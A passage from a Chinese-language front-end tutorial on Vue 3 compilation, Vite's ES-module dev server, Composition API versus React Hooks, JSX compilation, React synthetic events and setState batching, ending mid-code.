<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">_ctx<span class="token punctuation">,</span> _cache<span class="token punctuation">,</span> $props<span class="token punctuation">,</span> $setup<span class="token punctuation">,</span> $data<span class="token punctuation">,</span> $options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">_openBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_createElementBlock</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>msg<span class="token punctuation">)</span>
      <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token function">_openBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">_createElementBlock</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;hello vue3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token operator">:</span> <span class="token function">_createCommentVNode</span><span class="token punctuation">(</span><span class="token string">&quot;v-if&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">_withDirectives</span><span class="token punctuation">(</span><span class="token function">_createElementVNode</span><span class="token punctuation">(</span><span class="token string">&quot;input&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token string-property property">&quot;onUpdate:modelValue&quot;</span><span class="token operator">:</span> <span class="token parameter">$event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">.</span>msg<span class="token punctuation">)</span> <span class="token operator">=</span> $event<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token comment">/* PROPS */</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;onUpdate:modelValue&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token punctuation">[</span>_vModelText<span class="token punctuation">,</span> _ctx<span class="token punctuation">.</span>msg<span class="token punctuation">]</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="vite-为什么启动非常快"><a href="#vite-为什么启动非常快" class="header-anchor">#</a> Vite 为什么启动非常快</h3> <ul><li>开发环境使用<code>Es6 Module</code>，无需打包，非常快</li> <li>生产环境使用<code>rollup</code>，并不会快很多</li></ul> <p><strong>ES Module 在浏览器中的应用</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>基本演示<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>module<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">import</span> add <span class="token keyword">from</span> <span class="token string">'./src/add.js'</span>

    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'add res'</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>module<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">import</span> <span class="token punctuation">{</span> add<span class="token punctuation">,</span> multi <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./src/math.js'</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'add res'</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'multi res'</span><span class="token punctuation">,</span> <span class="token function">multi</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>外链引用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>module<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./src/index.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>远程引用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>module<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">import</span> <span class="token punctuation">{</span> createStore <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'https://unpkg.com/redux@latest/es/redux.mjs'</span> <span class="token comment">// es module规范mjs</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'createStore'</span><span class="token punctuation">,</span> createStore<span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>动态引入<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>load1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn2<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>load2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>module<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> add <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./src/add.js'</span><span class="token punctuation">)</span>
        <span class="token keyword">const</span> res <span class="token operator">=</span> add<span class="token punctuation">.</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'add res'</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token punctuation">{</span> add<span class="token punctuation">,</span> multi <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./src/math.js'</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'add res'</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'multi res'</span><span class="token punctuation">,</span> <span class="token function">multi</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="composition-api-和-react-hooks-的对比"><a href="#composition-api-和-react-hooks-的对比" class="header-anchor">#</a> Composition API 和 React Hooks 的对比</h3> <ul><li>前者<code>setup</code>(相当于<code>created</code>、<code>beforeCreate</code>的合集)只会调用一次，而<code>React Hooks</code>函数在渲染过程中会被多次调用</li> <li><code>Composition API</code>无需使用<code>useMemo</code>、<code>useCallback</code>，因为<code>setup</code>只会调用一次，在<code>setup</code>闭包中缓存了变量</li> <li><code>Composition API</code>无需顾虑调用顺序，而<code>React Hooks</code>需要保证<code>hooks</code>的顺序一致（比如不能放在循环、判断里面）</li> <li><code>Composition API</code>的<code>ref</code>、<code>reactive</code>比<code>useState</code>难理解</li></ul> <h2 id="_6-react"><a href="#_6-react" class="header-anchor">#</a> 6 React</h2> <h3 id="jsx本质"><a href="#jsx本质" class="header-anchor">#</a> JSX本质</h3> <ul><li><code>React.createElement</code> 即<code>h</code>函数，返回<code>vnode</code></li> <li>第一个参数，可能是组件，也可能是<code>html tag</code></li> <li>组件名，首字母必须是大写（<code>React</code>规定）</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// React.createElement写法</span>
React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'tag'</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>child1<span class="token punctuation">,</span>child2<span class="token punctuation">]</span><span class="token punctuation">)</span>
React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'tag'</span><span class="token punctuation">,</span> props<span class="token punctuation">,</span> child1<span class="token punctuation">,</span>child2<span class="token punctuation">,</span>child3<span class="token punctuation">)</span>
React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>Comp<span class="token punctuation">,</span> props<span class="token punctuation">,</span> child1<span class="token punctuation">,</span>child2<span class="token punctuation">,</span><span class="token string">'文本节点'</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-jsx extra-class"><pre class="language-jsx"><code><span class="token comment">// jsx基本用法</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">tet</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>imgSrc<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">// 编译后 https://babeljs.io/repl</span>
React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
  <span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">className</span><span class="token operator">:</span> <span class="token string">&quot;container&quot;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;p&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">&quot;tet&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;img&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">src</span><span class="token operator">:</span> imgSrc
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><div class="language-jsx extra-class"><pre class="language-jsx"><code><span class="token comment">// jsx style</span>
<span class="token keyword">const</span> styleData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">fontSize</span><span class="token operator">:</span><span class="token string">'20px'</span><span class="token punctuation">,</span><span class="token literal-property property">color</span><span class="token operator">:</span><span class="token string">'#f00'</span><span class="token punctuation">}</span>
<span class="token keyword">const</span> styleElem <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>styleData<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">设置style</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">// 编译后</span>
<span class="token keyword">const</span> styleData <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">fontSize</span><span class="token operator">:</span> <span class="token string">&quot;20px&quot;</span><span class="token punctuation">,</span>
  <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">&quot;#f00&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> styleElem <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
  <span class="token string">&quot;p&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">style</span><span class="token operator">:</span> styleData
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">&quot;\u8BBE\u7F6Estyle&quot;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><div class="language-jsx extra-class"><pre class="language-jsx"><code><span class="token comment">// jsx加载组件</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Input</span></span> <span class="token attr-name">submitTitle</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>onSubmitTitle<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">list</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>list<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">// 编译后</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
  <span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span>
  <span class="token keyword">null</span><span class="token punctuation">,</span>
  React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>Input<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">submitTitle</span><span class="token operator">:</span> onSubmitTitle
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>List<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">list</span><span class="token operator">:</span> list
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><div class="language-jsx extra-class"><pre class="language-jsx"><code><span class="token comment">// jsx事件</span>
<span class="token keyword">const</span> eventList <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>clickHandler<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">text</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">// 编译后</span>
<span class="token keyword">const</span> eventList <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
  <span class="token string">&quot;p&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">onClick</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>clickHandler
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">&quot;text&quot;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// jsx列表</span>
<span class="token keyword">const</span> listElem <span class="token operator">=</span> <span class="token operator">&lt;</span>ul<span class="token operator">&gt;</span>
<span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span>index</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token operator">&lt;</span>li key<span class="token operator">=</span><span class="token punctuation">{</span>index<span class="token punctuation">}</span><span class="token operator">&gt;</span>index<span class="token operator">:</span><span class="token punctuation">{</span>index<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>title<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
 <span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>

<span class="token comment">// 编译后</span>

<span class="token keyword">const</span> listElem <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
  <span class="token string">&quot;ul&quot;</span><span class="token punctuation">,</span>
  <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
      <span class="token string">&quot;li&quot;</span><span class="token punctuation">,</span>
      <span class="token punctuation">{</span>
        <span class="token literal-property property">key</span><span class="token operator">:</span> index
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">&quot;index:&quot;</span><span class="token punctuation">,</span>
      index<span class="token punctuation">,</span>
      <span class="token string">&quot;,title:&quot;</span><span class="token punctuation">,</span>
      item<span class="token punctuation">.</span>title
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="react合成事件机制"><a href="#react合成事件机制" class="header-anchor">#</a> React合成事件机制</h3> <ul><li><code>React16</code>事件绑定到<code>document</code>上</li> <li><code>React17</code>事件绑定到<code>root</code>组件上，有利于多个<code>react</code>版本共存，例如微前端</li> <li><code>event</code>不是原生的，是<code>SyntheticEvent</code>合成事件对象</li> <li>和<code>Vue</code>不同，和<code>DOM</code>事件也不同</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/2ed64c281a747078.png" loading="lazy" class="lazy"></p> <p><strong>合成事件图示</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/bd7cd8acbb3cfd85.png" loading="lazy" class="lazy"></p> <p><strong>为何需要合成事件</strong></p> <ul><li>更好的兼容性和跨平台，如<code>react native</code></li> <li>挂载到<code>document</code>或<code>root</code>上，减少内存消耗，避免频繁解绑</li> <li>方便事件的统一管理（如事务机制）</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 获取 event</span>
<span class="token function-variable function">clickHandler3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 阻止默认行为</span>
    event<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 阻止冒泡</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>target<span class="token punctuation">)</span> <span class="token comment">// 指向当前元素，即当前元素触发</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'current target'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>currentTarget<span class="token punctuation">)</span> <span class="token comment">// 指向当前元素，假象！！！</span>

    <span class="token comment">// 注意，event 其实是 React 封装的。可以看 __proto__.constructor 是 SyntheticEvent 组合事件</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'event'</span><span class="token punctuation">,</span> event<span class="token punctuation">)</span> <span class="token comment">// 不是原生的 Event ，原生的 MouseEvent</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'event.__proto__.constructor'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor<span class="token punctuation">)</span>

    <span class="token comment">// 原生 event 如下。其 __proto__.constructor 是 MouseEvent</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nativeEvent'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>nativeEvent<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nativeEvent target'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>nativeEvent<span class="token punctuation">.</span>target<span class="token punctuation">)</span>  <span class="token comment">// 指向当前元素，即当前元素触发</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nativeEvent current target'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>nativeEvent<span class="token punctuation">.</span>currentTarget<span class="token punctuation">)</span> <span class="token comment">// 指向 document ！！！</span>

    <span class="token comment">// 1. event 是 SyntheticEvent ，模拟出来 DOM 事件所有能力</span>
    <span class="token comment">// 2. event.nativeEvent 是原生事件对象</span>
    <span class="token comment">// 3. 所有的事件，都被挂载到 document 上</span>
    <span class="token comment">// 4. 和 DOM 事件不一样，和 Vue 事件也不一样</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="setstate和batchupdate机制"><a href="#setstate和batchupdate机制" class="header-anchor">#</a> setState和batchUpdate机制</h3> <ul><li><code>setState</code>在react事件、生命周期中是异步的（在<code>react</code>上下文中是异步）；在<code>setTimeout</code>、自定义<code>DOM</code>事件中是同步的</li> <li>有时合并（对象形式<code>setState({})</code> =&gt; 通过<code>Object.assign</code>形式合并对象），有时不合并（函数形式<code>setState((prevState,nextState)=&gt;{})</code>）</li></ul> <p><strong>核心要点</strong></p> <p>1.<code>setState</code>主流程</p> <ul><li><code>setState</code>是否是异步还是同步，看是否能命中<code>batchUpdate</code>机制，判断<code>isBatchingUpdates</code></li> <li>哪些能命中<code>batchUpdate</code>机制
<ul><li>生命周期</li> <li><code>react</code>中注册的事件和它调用的函数</li> <li>总之在<code>react</code>的上下文中</li></ul></li> <li>哪些不能命中<code>batchUpdate</code>机制
<ul><li><code>setTimeout</code>、<code>setInterval</code>等</li> <li>自定义<code>DOM</code>事件</li> <li>总之不在<code>react</code>的上下文中，<code>react</code>管不到的</li></ul></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/1ede1982d9eb5a45.png" loading="lazy" class="lazy"></p> <ol start="2"><li><code>batchUpdate</code>机制</li></ol> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/7bb96642c305b9d6.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/e0e5828f54c4d6a1.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState batchUpdate原理模拟</span>
<span class="token keyword">let</span> isBatchingUpdate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> state <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">setState</span><span class="token punctuation">(</span><span class="token parameter">newSate</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token comment">//state={...state,...newSate}</span>
  <span class="token comment">// setState异步更新</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>isBatchingUpdate<span class="token punctuation">)</span><span class="token punctuation">{</span>
    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newSate<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment">// setState同步更新</span>
    state<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">...</span>state<span class="token punctuation">,</span><span class="token operator">...</span>newSate<span class="token punctuation">}</span>
  <span class="token punctuation">}</span>   
<span class="token punctuation">}</span>

